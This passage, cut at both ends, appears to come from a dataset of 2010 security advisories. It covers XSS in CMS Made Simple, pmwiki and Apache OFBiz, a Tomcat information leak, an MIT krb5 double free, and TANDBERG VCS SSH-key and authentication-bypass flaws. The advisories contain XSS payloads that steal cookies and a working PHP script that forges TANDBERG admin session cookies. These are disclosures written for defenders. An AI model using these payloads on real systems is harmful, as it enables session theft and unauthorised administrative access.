VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service:
http://www.vupen.com/english/services/
* VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/exploits/
* VUPEN Web Application Security Scanner (WASS):
http://www.vupen.com/english/wass/
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1128
http://www.adobe.com/support/security/bulletins/apsb10-12.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0129
IX. DISCLOSURE TIMELINE
-----------------------------
2010-02-24 - Vendor notified
2010-02-24 - Vendor response
2010-03-02 - Status update received
2010-05-07 - Status update received
2010-05-12 - Coordinated public Disclosure"
15442,"CMS Made Simple: backend cross site scripting (XSS), CVE-2010-1482",,CVE-2010-1482,"CMS Made Simple: backend cross site scripting (XSS), CVE-2010-1482
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1482
http://int21.de/cve/CVE-2010-1482-cmsmadesimple-xss-backend.html
http://blog.cmsmadesimple.org/2010/05/01/announcing-cms-made-simple-1-7-1-escade/
Description
CMS Made Simple 1.7.0 and earlier is vulnerable to cross site scripting in the
backend. The personal options page at admin/editprefs.php contains the field
date_format_string, which is not properly escaped and can be filled with
Javascript-code, e.g. ""><script>alert(1)</script>.
As this page cannot be viewed by the admin or other users, this only allows
quite unlikely attack scenarios, so the impact should be considered very low.
Vendor has released 1.7.1, which filters out HTML-tags and restricts the field
size to 10 chars. Filtering out HTML-tags alone does not help, as one can
still use JavaScript event handlers (e.g. onMouseOver), but 10 chars doesn't
allow any useful code to be injected. The proper solution would be escaping
the output including quotes. So this is fixed, but it's not a very clean
solution.
Disclosure Timeline
2010-04-30: Vendor contacted
2010-04-30: Vendor replied
2010-05-01: Vendor released 1.7.1 with fix
2010-05-07: Published advisory
Credits
This vulnerability was discovered by Hanno Boeck, http://www.hboeck.de, of
schokokeks.org webhosting.
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de
http://schokokeks.org - professional webhosting"
15443,"pmwiki: persistent cross site scripting (XSS), CVE-2010-1481",,CVE-2010-1481,"pmwiki: persistent cross site scripting (XSS), CVE-2010-1481
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1481
http://int21.de/cve/CVE-2010-1481-pmwiki-xss.html
Description
The table feature of pmwiki is vulnerable to persistent cross site scripting
(XSS). The value of the width-parameter is not proberly escaped on output, so
one can put quotes in it. This makes it possible to use a JavaScript event
handler inside the first table field to inject code.
Example:
||width=""
|| "" onMouseOver=alert(1) "" ||test||
The vendor has been contacted, but has not replied to my report.
Disclosure Timeline
2010-04-19: Vendor contacted
2010-05-07: Published advisory
Credits
This vulnerability was discovered by Hanno Boeck, http://www.hboeck.de, of
schokokeks.org webhosting.
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de
http://schokokeks.org - professional webhosting"
15549,[SECURITY] CVE-2010-1157: Apache Tomcat information disclosure vulnerability,,CVE-2010-1157,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2010-1157: Apache Tomcat information disclosure vulnerability
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 6.0.0 to 6.0.26
- - Tomcat 5.5.0 to 5.5.29
Note: The unsupported Tomcat 3.x, 4.x and 5.0.x versions may also be
affected.
Description:
The ""WWW-Authenticate"" header for BASIC and DIGEST authentication
includes a realm name. If a <realm-name> element is specified for the
application in web.xml it will be used. However, a <realm-name> is not
specified then Tomcat will generate one using the code snippet:
request.getServerName() + "":"" + request.getServerPort()
In some circumstances this can expose the local hostname or IP address
of the machine running Tomcat.
Example:
GET /application/j_security_check HTTP/1.0
HTTP/1.1 401 Unauthorized
Server: Apache-Coyote/1.1
WWW-Authenticate: Basic realm=""tomcat01:8080""
Content-Type: text/html;charset=utf-8
Content-Length: 954
Date: Thu, 31 Dec 2009 12:18:11 GMT
Connection: close
Mitigation:
Administrators of web applications that use BASIC or DIGEST
authentication are recommended to set an appropriate realm name in the
web application's web.xml file.
Alternatively, the following patches may be used to change the default
realm to ""Authentication required"" (without the quotes):
- - Tomcat 6.0.x: http://svn.apache.org/viewvc?view=rev&rev=936540
- - Tomcat 5.5.x: http://svn.apache.org/viewvc?view=rev&rev=936541
These patches will be included in the next releases of Tomcat 5.5.x and
Tomcat 6.0.x. No release date has been set for the next Tomcat 5.5.x and
Tomcat 6.0.x releases.
Credit:
This issue was discovered by Deniz Cevik.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJLz3o5AAoJEBDAHFovYFnn7NgP/jyjnqK98FfruhzL0eB/b748
7EYP8k//kbmq8SIYyDkHkmlGfDNE+epxLudgSLbwg8QJdNG50JHwjTzAcclPCyu6
jx3NuJVKxn8KloD3rmxhrIItLG/yQ50JP3tnNO3xC4pS4j8dzdrTS2lFPXxcna6e
o9rMUwPLTEsLvNhd93sUIpdXuLhG9TP7dOeAD737ybvmRcz612igGyyT3hVUeGsK
TvJ+uzZTLJi+Wz0UMRdseqsgp1OW2DeMyao67bPaUrbX9EfLA+yUfXV6TRByT4C5
S5BB3mTz8WBgWkscCmKB0mqmtiPfv7PxlRDfMyPAkFhezPAnL5UD4fSZ3Aes8rTO
IF6CM/lWXm+eMECVwuIh7RdiPJtpe/1ZTQ2EtAQ/JZOIoDX2sKNF92opGeNiZPp9
P78tfksI23tLNJeDcJmL1a2L1yP8pcvAnd6AhYwZPc+LoZBKOsqEMMDU9CmbT3LY
2Fyn8h5yV9Fql9TR9J87aB9BDcQ5vqtdJ17qO20ur54SockI/oNi45tpDf76sJQB
0iOVY1MDu9J4c3xvtmWrdsAZF8VFDhW8nXdKOATh2cVQg/P4aELW2eyGUbiL5hLZ
EWgiZRQWm815MqEwikbztMON4OipensBx1wNuKvj2VKs3VK8tkSuXigViOCTYo+c
mm73gFAt6VWTF5sbfTuA
=mtgX
-----END PGP SIGNATURE-----"
15558,MITKRB5-SA-2010-004 [CVE-2010-1320] double free in KDC,,CVE-2010-1320,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2010-004
MIT krb5 Security Advisory 2010-004
Original release: 2010-04-20
Topic: double free in KDC
CVE-2010-1320
CVSSv2 Vector: AV:N/AC:L/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 9
Access Vector: Network
Access Complexity: Low
Authentication: Single
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
CVSSv2 Temporal Score: 7
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
A double free vulnerability exists in the KDC in MIT krb5 releases
krb5-1.7 and later.
This is an implementation vulnerability in MIT krb5, and not a
vulnerability in the Kerberos protocol.
IMPACT
======
An authenticated remote attacker can crash the KDC by inducing the KDC
to perform a double free. Under some circumstances on some platforms,
this could also allow malicious code execution. Successfully inducing
code execution by exploiting a double free is believed to be
difficult, and no such exploits are known to exist for this
vulnerability.
AFFECTED SOFTWARE
=================
* KDC in krb5-1.7 and later
FIXES
=====
* The upcoming krb5-1.8.2 release, as well as an upcoming krb5-1.7
series release, will contain a fix.
* Apply the following patch:
diff --git a/src/kdc/do_tgs_req.c b/src/kdc/do_tgs_req.c
index b2f0655..76ca94a 100644
- --- a/src/kdc/do_tgs_req.c
+++ b/src/kdc/do_tgs_req.c
@@ -543,6 +543,7 @@ tgt_again:
to the caller */
ticket_reply = *(header_ticket);
enc_tkt_reply = *(header_ticket->enc_part2);
+ enc_tkt_reply.authorization_data = NULL;
clear(enc_tkt_reply.flags, TKT_FLG_INVALID);
}
@@ -554,6 +555,7 @@ tgt_again:
to the caller */
ticket_reply = *(header_ticket);
enc_tkt_reply = *(header_ticket->enc_part2);
+ enc_tkt_reply.authorization_data = NULL;
old_life = enc_tkt_reply.times.endtime - enc_tkt_reply.times.starttime;
This patch is also available at
http://web.mit.edu/kerberos/advisories/2010-004-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2010-004-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2010-004.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2010-1320
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1320
Debian bug #577490
http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=577490
ACKNOWLEDGMENTS
===============
Joel Johnson reported this bug to Debian. Brian Almeida provided a
report that this bug affects krb5-1.7 releases.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/8B8DF501 2010-01-15 [expires: 2011-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
When process_tgs_req() handles renewal or validation of existing
tickets, it copies header_ticket->enc_part2 (from the ticket that is
being validated or renewed) to enc_tkt_reply (the new ticket being
generated for the reply). This causes
enc_tkt_reply.authorization_data to be an alias for memory that
belongs to the request. As process_tgs_req() exits, it frees both
header_ticket and enc_tkt_reply, which causes the aliased memory to be
freed twice.
In the krb5-1.8 releases, unlike prior MIT krb5 releases, the TGS
request processing normally adds a ""signedpath"" authorization data
element, which causes merge_authdata() to run. Inside
merge_authdata() is a call to realloc() that can potentially cause the
authorization data from header_ticket to be freed (if realloc() needs
to relocate the memory) an additional time before the cleanup code at
the end of process_tgs_req(). The krb5-1.7 releases can still
encounter this condition under less common circumstances, such as when
a client provides authorization data that it wants the KDC include in
the new ticket.
REVISION HISTORY
================
2010-04-20 original release
Copyright (C) 2010 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAkvN7+QACgkQSO8fWy4vZo5+dQCfV+qgkScspXVbQ9rgZ/L8m1Rp
9mcAn31H+mi9pTcmEyhMzRuXD47VVKv3
=W2dB
-----END PGP SIGNATURE-----"
15605,[CVE-2010-0432] Apache OFBiz Multiple XSS Vulnerabilities,,CVE-2010-0432,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Bonsai Information Security - Advisory
http://www.bonsai-sec.com/research/
Multiple XSS in Apache OFBiz
1. *Advisory Information*
Title: Multiple XSS in Apache OFBiz
Advisory ID: BONSAI-2010-0103
Advisory URL: http://www.bonsai-sec.com/research/vulnerabilities/apacheofbiz-multiple-xss-0103.php
Date published: 2010-04-14
Vendors contacted: Apache Software Foundation
Release mode: Coordinated release
2. *Vulnerability Information*
Class: Multiple Cross Site Scripting (XSS)
Remotely Exploitable: Yes
Locally Exploitable: Yes
CVE Name: CVE-2010-0432
3. *Software Description*
Apache Open For Business (Apache OFBiz) is a community-driven
Open Source Enterprise Resource Planning (ERP) system.
It provides a suite of enterprise applications that integrate
and automate many of the business processes of an enterprise.
Apache OFBiz is a foundation and starting point for reliable,
secure and scalable enterprise solutions.
OFBiz is an Apache Software Foundation top level project.
4. *Vulnerability Description*
Cross-Site Scripting attacks are a type of injection problem, in which
malicious scripts are injected into the otherwise benign and trusted web sites.
Cross-site scripting (XSS) attacks occur when an attacker uses a web
application to send malicious code, generally in the form of a browser side
script, to a different end user. Flaws that allow these attacks to succeed are
quite widespread and occur anywhere a web application uses input from a user
in the output it generates without validating or encoding it.
This vulnerability can be exploited to force a logged in Administrator
to run arbitrary SQL commands [3] or create a new user with Full Privileges [4].
You can find customized XSS PoC payloads here.
For additional information and a demostrative video, please read [1] and [2].
5. *Vulnerable packages*
Apache OFBiz:
- Stable Version <= 9.04
- SVN Revision <= 920371
- Release Branch Candidate 4.0 Revision <= 920381
Products based on Apache OFBiz:
- Opentaps Version <= 1.4
- Neogia Version <= 1.0
- Entente Oya Version <= 1.6
Since there are more products based on Apache OFBiz, these vulnerabilities resides
in some of them but unconfirmed. Check [2] for updates.
6. *Mitigation*
SVN Trunk users should update to at least revision 920372
from svn or apply the following patches [5].
Release Branch Candidate 09.04 should update to at least revision 920382
from svn or applythe following patches [6].
Apache Software Foundation developers informed us that all users should
upgrade to the latest version of Apache OFBiz, which fixes this vulnerability.
More information to be found here:
http://ofbiz.apache.org
7. *Credits*
These vulnerabilities were discovered by Lucas Apa ( lucas -at- bonsai-sec.com ).
8. *Technical Description*
8.1 A Reflected Cross Site Scripting vulnerability was found in the
""productStoreId"" variable within the 'Export Product Listing' section.
When rendering menu widget item links of type hidden-form, the hidden
input value attributes were not being html encoded. In many cases these
hidden input values are derived from request parameters and could be used
in a Reflected Cross-Site Scripting attack.
For a page that contains a menu widget with the following menu item definition:
<menu-item name=""ebayExportAllCategoryToEbayStore"" title=""${uiLabelMap.EbayExportAllCategoryToEbayStore}"">
<link target=""exportCategoryEbayStore"">
<parameter param-name=""productStoreId"" value=""${parameters.productStoreId}""/>
</link>
</menu-item>
The vulnerability can be triggered by clicking on the
following URL:
https://www.ofbiz-example.com/ebaystore/control/exportProductListing?productStoreId=90100""
style=""width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px""
onMouseOver=""alert(document.cookie)
8.2 A Reflected Cross Site Scripting vulnerability was found in the
""partyId"" variable within the 'View Profile' section.
This is because the application does not properly sanitise
the users input. The vulnerability can be triggered by clicking on the
following URL:
https://www.ofbiz-example.com/partymgr/control/viewprofile?&partyId=aa""
style=""width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px""
onMouseOver=""alert(document.cookie)
https://www.neogia-example.com/partymgr/control/login;partyId=aa""
style=""width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px""
onMouseOver=""alert(document.cookie)
https://www.opentaps-example.com/partymgr/control/viewprofile?partyId=aa""
style=""width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px""
onMouseOver=""alert(document.cookie)
8.3 A Reflected Cross Site Scripting vulnerability was found in the
""start"" variable within the 'Show Portal Page' section.
During page rendering, if a FreeMarker TemplateException is thrown
then the stack trace is printed directly into the response and the
exception messages may contain un-sanitized user input which can expose
a Reflected Cross-Site Scripting vulnerability.
For any page rendered via a FreeMarker template that contains:
${screens.render(screenLocation, screenName)}
(or a similar screens.render(‚Ä¶) call)
The vulnerability can be triggered by clicking on the
following URL:
https://www.ofbiz-example.com/myportal/control/showPortalPage?period=week
&start=1266796800000<script>alert(document.cookie)</script>
8.4 A 404-based Reflected Cross Site Scripting vulnerability was found
on the whole application.
When using the ControlServlet, if an invalid request URI is supplied then
the 404 error page displays the requested URI without first sanitizing it.
The vulnerability can be triggered by clicking on the
following URL:
https://www.ofbiz-example.com/facility/control/ReceiveReturn""<b><body onLoad=""alert(document.cookie)""><br><div>><!--
https://www.neogia-example.com/facility/control/ReceiveReturn""<b><body onLoad=""alert(document.cookie)""><br><div>><!--
http://www.opentaps-example.com/crmsfa/control/ReceiveReturn""<b><body onLoad=""alert(document.cookie)""><br><div>><!--
https://www.ententeoya-example.com/cms/control/ReceiveReturn""<b><body onLoad=""alert(document.cookie)""><br><div>><!--
8.5 A Reflected Cross Site Scripting vulnerability was found
on the ecommerce section specifically in the 'entityName' variable.
The vulnerability can be triggered by clicking on the
following URL:
http://www.ofbiz-example.com/ecommerce/control/ViewBlogArticle?contentId=BLG10000<script>
alert(document.cookie)</script>&blogContentId=BLOGROOTBIGAL
http://www.opentaps-example.com/ecommerce/control/ViewBlogArticle?contentId=BLG10000<script>
alert(document.cookie)</script>&blogContentId=BLOGROOTBIGAL
8.6 A Reflected Cross Site Scripting vulnerability was found in the
""entityName"" variable within the 'Web Tools' section.
This is because the application fails to correctly sanitize
multiple form widget controls data before rendering it.
The vulnerability can be triggered by clicking on the
following URL:
https://www.ofbiz-example.com/webtools/control/FindGeneric?entityName=AccommodationClass<script>
alert(document.cookie)</script>&find=true&VIEW_SIZE=50&VIEW_INDEX=0
8.7 A Persistant Cross Site Scripting vulnerability was found in almost
every user controlled parameters within the application.
This is because the application does not properly sanitise
the users input. An example of this vulnerability can be triggered by
following these steps.
i) A logged in user sends the following string on 'subject' or 'content'
parameters within the 'ecommerce/control/contactus' section.
<script>alert(document.cookie)</script>
ii) A logged in Administrator browses 'Other Party Comms' section.
iii) The browser executes the JavaScript on every future Other Party Comms load.
9. *Report Timeline*
- 2010-02-17:
Vulnerabilities were identified.
- 2010-02-23:
Vendor contacted.
- 2010-02-24:
Other products based on Ofbiz contacted. No specific answer given
- 2010-02-27:
Vendor confirms this issue and inform us a fix will be available soon.
- 2010-03-08:
Vendor fixed this issue.
- 2010-03-09:
Other products based on Ofbiz contacted again for an approximate fix release date. No answer.
- 2010-03-12:
Other products based on Ofbiz contacted. No answer.
- 2010-04-06:
The advisory BONSAI-2010-0103 is published.
10. *References*
[0] http://ofbiz.apache.org/
[1] http://www.owasp.org/index.php/Cross_site_scripting
[2] http://www.bonsai-sec.com/en/research/vulnerabilities/ofbizexploiter.php
[3] http://www.bonsai-sec.com/en/research/vulnerabilities/create-user-xss-payload.js
[4] http://www.bonsai-sec.com/en/research/vulnerabilities/sql-exec-xss-payload.js
[5] http://svn.apache.org/viewvc?rev=920369&view=rev
http://svn.apache.org/viewvc?rev=920370&view=rev
http://svn.apache.org/viewvc?rev=920371&view=rev
http://svn.apache.org/viewvc?rev=920372&view=rev
[6] http://svn.apache.org/viewvc?rev=920379&view=rev
http://svn.apache.org/viewvc?rev=920380&view=rev
http://svn.apache.org/viewvc?rev=920381&view=rev
http://svn.apache.org/viewvc?rev=920382&view=rev
[7] http://www.bonsai-sec.com/blog
11. *About Bonsai*
Bonsai is a company involved in providing professional computer information security services.
Currently a sound growth company, since its foundation in early 2009 in Buenos Aires, Argentina,
we are fully committed to quality service, and focused on our customers' real needs.
12. *Disclaimer*
The contents of this advisory are copyright (c) 2010 Bonsai Information Security, and may be
distributed freely provided that no fee is charged for this distribution and proper credit is
given.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.14 (Darwin)
iQIcBAEBAgAGBQJLxhctAAoJEHpYCQiEevngiA0P/3zVyzFhGyVqWGvA0BuNRYpT
4nh847mRQxGpo2pZInSy8IBKOXl/qTIXss4hhV4gQyP4uXVRB8yRtsldF4yGbfXf
/xrZlmtTwYv1w/A4cjIoqXbvBelQB+LaWiTh1Y4J4QRGjH+/O6PHYzkDERIICGbi
OF5tWeV2YrOStOqwEjcDk7BPJn9OkBwuz3dcvWDHbqM7Ghk+49AkmL7Ww4HCZ6K6
Uz++m27iilS0O+OSjrJAKUOMiwIg2HzhZJ5ivVtKw0QQLj57cVJRKMFaG53qhmdo
FXMYjv2T6lgSbKOEb93Vd/UCZD4dtz3WwRPCW4aX4BMPoSqMNVXcg8cY/7XDqoIq
/MSCNDYV77LUXAVEKpljR7OyhJbokBx+U6X76M8/yk9AXbOJ2wS1dZtmWKt+8ArN
kZyxESEKSW+pAyDrRLNRjGWAQJ3oz2xqDnhzquE6Z2exTZeH/bSFyMK9H4Sp3vOj
SuujBPPV5U+56Lg/Pj4tbpq2yty+btIzwU7PF82jC++BpfCbhsJHp1fd4Es8K9+N
0aDS2lIupf6B0eVbMZSf/nwT+sGEA8BeYbLGRz11Zp2n7VFKb4psuoGIz90kGVCO
G8An0AcakANtDrQaybEeFAYkDM4f9GbCGXHF1dHoU8Khw5AfDduu1zVzC2nb7cHP
bmLjOnQ/c+Pm0wLC++Ln
=DaoK
-----END PGP SIGNATURE-----"
15648,CVE-2009-4510: TANDBERG VCS Static SSH Host Keys,,CVE-2009-4510,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Virtual Security Research, LLC.
http://www.vsecurity.com/
Security Advisory
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Advisory Name: TANDBERG Video Communication Server Static SSH Host Keys
Release Date: 2010-04-09
Application: Video Communication Server (VCS)
Versions: x4.3.0, x4.2.1, and possibly earlier
Severity: High
Discovered by: Jon Hart
Advisory by: Timothy D. Morgan <tmorgan (a) vsecurity . com>
Vendor Status: Firmware version x5.1.1 released [2].
CVE Candidate: CVE-2009-4510
Reference: http://www.vsecurity.com/resources/advisory/20100409-2/
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Product Description
- -------------------
- From [1]:
""The Video Communication Server (VCS) is an integral part of the TANDBERG
Total Solution and is the center of the video communications network,
connecting the benefits of video conferencing and telepresence to other
communications environments including unified communications and IP Telephony
networks.""
Vulnerability Overview
- ----------------------
On December 2nd, VSR identified a SSH service authentication weakness
vulnerability in the TANDBERG's Video Communication Server. This issue would
allow an attacker with privileged network access to conduct server impersonation
and man-in-the-middle attacks on administrator SSH sessions. Successful attacks
could yield shell access to vulnerable appliances.
Product Background
- ------------------
The TANDBERG Video Communication Server is a Linux-based appliance which
supports the interoperation of a plethora of video and voice communications
devices. The VCS provides several system shell accounts accessible via the SSH
protocol.
Vulnerability Details
- ---------------------
The TANDBERG VCS appliance is deployed by default with a DSA ssh key pair stored
in files:
/tandberg/sshkeys/ssh_host_dsa_key
/tandberg/sshkeys/ssh_host_dsa_key.pub
In tested versions of the firmware, this default key has a fingerprint of:
49:53:bf:94:2a:d7:0c:3f:48:29:f7:5b:5d:de:89:b8
No new key is generated upon installation. In addition, this default key would
overwrite any SSH server keys, if installed by security-conscious administrators
previously, during a firmware upgrade.
Due to the public nature of this key (see firmware downloads [2]) an attacker
would be able to conduct server impersonation and man-in-the-middle attacks on
SSH connections directed at any TANDBERG VCS device. A successful exploit would
most likely yield an attacker shell access to the device with privileges of the
victim client.
Versions Affected
- -----------------
VSR has observed this vulnerability in version x4.2.1. Based on preliminary
analysis of configuration files and scripts [2], versions x4.3.0 and x5.0 also
appear to be vulnerable. Earlier versions have not been tested.
Vendor Response
- ---------------
The following timeline details TANDBERG's response to the reported issue:
2009-12-09 Preliminary notice to TANDBERG. TANDBERG responded immediately.
2009-12-22 VSR provided TANDBERG a draft advisory.
2009-12-28 TANDBERG provided VSR with a beta version of the x5.0 firmware,
but this did not appear to correct the issue.
2010-01-22 TANDBERG provided VSR with a beta version of the x5.1 firmware,
but this did not appear to correct the issue for existing
installations, since old vulnerable keys would be preserved.
2010-01-28 TANDBERG explained that changing SSH keys automatically on
administrators may cause backward compatibility problems.
Therefore, TANDBERG decided to preserve old keys even when
upgrading a system which contains a vulnerable key.
Administrators will instead be warned in the web console that a
vulnerable key is in use and will be expected to update host keys
manually.
2010-03-26 TANDBERG provided VSR with a release candidate firmware for
version x5.1.1.
2010-04-07 TANDBERG VCS firmware version x5.1.1 released [2].
2010-04-09 VSR advisory released.
Recommendation
- --------------
Immediately replace the current SSH host key with a new one. This may
be accomplished through one of several methods. One approach is to
simply log in to the device locally and use the ssh-keygen utility to
replace the keys stored in /tandberg/sshkeys/. Consult TANDBERG
documentation for other methods.
After replacing the SSH host keys, it is recommended that the VCS
firmware be upgraded to X5.1.1 as soon as possible. NOTE: Upgrading or
downgrading to versions prior to X5.1.1 will cause any custom SSH host
keys to be overwritten. Version X5.1.1 and later should preserve any
custom host keys previously installed. As a precaution, after upgrading
or downgrading VCS firmwares, verify that the host key has not changed back
to the publicly known one with fingerprint:
49:53:bf:94:2a:d7:0c:3f:48:29:f7:5b:5d:de:89:b8
Common Vulnerabilities and Exposures (CVE) Information
- ------------------------------------------------------
The Common Vulnerabilities and Exposures (CVE) project has assigned
the number CVE-2009-4510 to this issue. This is a candidates for
inclusion in the CVE list (http://cve.mitre.org), which standardizes
names for security problems.
Acknowledgements
- ----------------
Thanks to TANDBERG for the quick initial response and cooperation.
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
References:
1. TANDBERG - Video Communication Server
http://www.tandberg.com/video-conferencing-network-infrastructure/video-communication-server.jsp
2. TANDBERG VCS Firmware Downloads
http://ftp.tandberg.com/pub/software/vcs/
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Copyright 2009,2010 Virtual Security Research, LLC. All rights reserved.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)
iD8DBQFLv/ZjQ1RSUNR+T+gRAk5EAJ9Aly3VUC1kCoseUASB/1gb+eRH6QCdE2Mc
NuQ3zzKVVFfT/KJVJ3gDsGo=
=AKS8
-----END PGP SIGNATURE-----"
15649,CVE-2009-4509: TANDBERG VCS Authentication Bypass,,CVE-2009-4509,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Virtual Security Research, LLC.
http://www.vsecurity.com/
Security Advisory
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Advisory Name: TANDBERG Video Communication Server Authentication Bypass
Release Date: 2010-04-09
Application: Video Communication Server (VCS)
Versions: x4.2.1 and possibly earlier
Severity: Critical
Discovered by: Jon Hart and Timothy D. Morgan
Advisory by: Timothy D. Morgan <tmorgan (a) vsecurity . com>
Vendor Status: Update released (without security advisory) on October 9, 2009
CVE Candidate: CVE-2009-4509
Reference: http://www.vsecurity.com/resources/advisory/20100409-1/
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Product Description
- -------------------
- From [1]:
""The Video Communication Server (VCS) is an integral part of the TANDBERG
Total Solution and is the center of the video communications network,
connecting the benefits of video conferencing and telepresence to other
communications environments including unified communications and IP Telephony
networks.""
Vulnerability Overview
- ----------------------
On December 2nd, VSR identified an authentication bypass vulnerability in
TANDBERG's Video Communication Server, firmware version x4.2.1. This
vulnerability allows for the complete bypass of authentication in the
administrative web console. Since this web interface can be used to execute
arbitrary code on the appliance as root (via software updates), the severity is
considered critical.
Product Background
- ------------------
The TANDBERG Video Communication Server is a Linux-based appliance which
supports the interoperation of a plethora of video and voice communications
devices. The VCS provides a web-based management interface implemented in PHP
which allows administrators to perform a wide variety of actions, including
configuration of the device, management of user accounts, firmware updates,
along with number of other items.
Vulnerability Details
- ---------------------
The TANDBERG VCS web management interface utilizes custom cookies for the
purpose of session management. In version x4.2.1 of the appliance firmware
(and possibly earlier versions), it is possible to forge session cookies with
relatively little knowledge of the appliance's configuration.
The vulnerability lies in the files located at the following paths:
/tandberg/web/lib/secure.php
/tandberg/web/user/lib/secure.php
Routines in these files generate user session cookies in roughly the following
way:
SECRET = SERVER_ADDRESS + STATIC_VALUE
HASH = md5(USERNAME + SECRET + CLIENT_ADDRESS + CURRENT_TIME)
COOKIE = USERNAME + ACCESS_RIGHTS + CLIENT_ADDRESS + CURRENT_TIME + HASH
In the above pseudocode, the SERVER_ADDRESS represents the VCS system's IP
address, STATIC_VALUE represents a fixed string which is hard-coded into the
application source, USERNAME is the authenticated user name, CLIENT_ADDRESS is
the IP address of the user's system, CURRENT_TIME is a simple UNIX time stamp,
and ACCESS_RIGHTS is an integer denoting the level of access assigned to the
user.
Note, that none of the information above is difficult to guess. Any owner of a
TANDBERG VCS would have access to the STATIC_VALUE (and in fact, this value is
contained in the firmware updates[2]). All TANDBERG appliances have a default
user name of ""admin"" which has full privileges. Therefore, it is possible with
a simple PHP script to forge new cookies and access the administrative
interface:
// NOTE: Portions of the following code are Copyright (C) 2009 TANDBERG //
function objectToCookie($obj)
{
$cookie = serialize($obj);
$cookie = gzcompress($cookie);
$cookie = base64_encode($cookie);
return $cookie;
}
function genCookie($server_addr, $remote_addr)
{
$user_name = ""root"";
$secret = $server_addr . ""139EF012B6A714A3BE0A867616C7F8"";
$time = time()+24*60*60;
$id_hash = md5($user_name . $secret . $remote_addr . $time);
$access = 1; // ReadWrite
$login_cookie =
array( ""user_name"" => $user_name,
""access"" => $access,
""id_hash"" => $id_hash,
""ip"" => $remote_addr,
""time"" => $time
);
return objectToCookie($login_cookie);
}
print ""Cookie: tandberg_login=""
. urlencode(genCookie(""{{SERVER_IP}}"", ""{{CLIENT_IP}}""))
. "" "";
// end of script //
TANDBERG released firmware version x4.3.0 which corrects this issue on
October 9, 2009 (prior to discovery of the vulnerability by VSR). The release
notes[3] for this updated version contain a description of the issue:
""Improved the security of the web interface to ensure that the system will not,
under any circumstances, allow an authenticated user to escalate their session
to more advanced privileges [Ref # 65050].""
However, VSR felt this does not adequately describe the problem. Clearly, as
the above exploit and pseudocode demonstrate, it would be possible to alter an
existing login session cookie to provide elevated ""access"" values without
updating the MD5 hash, since this value isn't included when the hash is
generated. However, the larger issue is that cookies can be forged from scratch
without an existing session.
In addition to this lack of clarity, no apparent security advisory for this
issue was released to the public via the normal channels (nor was it recorded in
the CVE as of this writing). Therefore, VSR felt it is in the public interest to
